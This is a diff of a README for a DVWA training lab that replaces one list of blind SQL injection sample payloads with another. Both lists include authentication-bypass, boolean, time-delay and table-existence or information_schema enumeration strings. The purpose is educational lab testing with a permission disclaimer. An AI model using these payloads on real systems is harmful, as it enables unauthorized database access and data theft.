@@ -71,49 +71,131 @@ Use the examples provided in the [Examples](#examples-of-blind-sql-injection-att
 
 Here are some sample payloads to test on the vulnerable application:
 
-#### 1. **Boolean-Based Blind SQL Injection**
+##### 1. Bypass Authentication Using Always-True Condition
 
-This method evaluates responses based on a condition:
-
-- True condition (bypasses authentication):
-```sql
-' OR 1=1 --
+### Query:
+```
+1' OR '1'='1' -- 
 ```
 
-- False condition (does not bypass authentication):
-```sql
-' OR 1=2 --
+##### Explanation:
+This query leverages an always-true condition (`'1'='1'`) to bypass checks and fetch any available record in the database.
+
+##### Expected Result:
 ```
-
-#### 2. **Time-Based Blind SQL Injection**
-
-This method uses time delays to infer information:
-
-- Delay the response if the condition is true:
-```sql
-' OR IF(1=1, SLEEP(5), 0) --
-```
-
-- Test if the username is 'admin':
-```sql
-' OR IF(username='admin', SLEEP(5), 0) --
-```
-
-#### 3. **Data Enumeration**
-
-Extract database structure or content:
-
-- List table names:
-```sql
-' UNION SELECT NULL, table_name FROM information_schema.tables --
-```
-
-- List column names from a specific table:
-```sql
-' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --
+User ID exists in the database.
 ```
 
 ---
+
+##### 2. Validating the Query with Always-True Condition
+
+#####Query:
+```
+1' AND '1'='1' -- 
+```
+
+#####Explanation:
+This query tests whether a condition that is always true (`'1'='1'`) correctly processes and confirms the result.
+
+#####Expected Result:
+```
+User ID exists in the database.
+```
+
+---
+
+##### 3. Testing for Always-False Condition
+
+##### Query:
+```
+1' AND '1'='2' -- 
+```
+
+##### Explanation:
+This query uses an always-false condition (`'1'='2'`) to validate that no result is returned when the condition fails.
+
+##### Expected Result:
+```
+User ID is MISSING from the database.
+```
+
+---
+
+##### 4. Fetching All Records Without Conditions
+
+##### Query:
+```
+1' OR 1=1 -- 
+```
+
+##### Explanation:
+This query bypasses any filter by using the logical condition `1=1`, which is always true.
+
+##### Expected Result:
+```
+User ID exists in the database.
+```
+
+---
+
+##### 5. Testing the Presence of a Table (Example: `users`)
+
+##### Query:
+```
+1' AND EXISTS(SELECT 1 FROM users) -- 
+```
+
+##### Explanation:
+This query checks whether a table named `users` exists in the database by using the SQL `EXISTS` function.
+
+##### Expected Result:
+```
+User ID exists in the database.
+```
+
+---
+
+##### 6. Testing for Non-Existing Table or Condition
+
+##### Query:
+```
+1' AND EXISTS(SELECT 1 FROM non_existing_table) -- 
+```
+
+##### Explanation:
+This query attempts to check for a non-existing table (`non_existing_table`) and should fail, demonstrating the absence of the table.
+
+##### Expected Result:
+```
+User ID is MISSING from the database.
+```
+
+---
+
+##### 7. Delay-Based Blind SQL Injection
+
+##### Query (If Supported):
+```
+1' AND IF(1=1, SLEEP(3), 0) -- 
+```
+
+##### Explanation:
+This query introduces a delay (`SLEEP(3)`) when the condition (`1=1`) is true, making it useful for blind SQL injection.
+
+##### Expected Behavior:
+- The response is delayed by 3 seconds if the condition is true.
+- No delay occurs if the condition is false.
+
+---
+
+##### Additional Notes
+- **Comment Style**: Use `--` followed by a space or `#` to terminate the query properly.
+- **Security Level**: Ensure that the DVWA security level is set to **Low** for these queries to work as expected.
+- **Testing Responsibly**: Only test on applications you own or have explicit permission to test.
+
+---
+
 
 ### Disclaimer
 
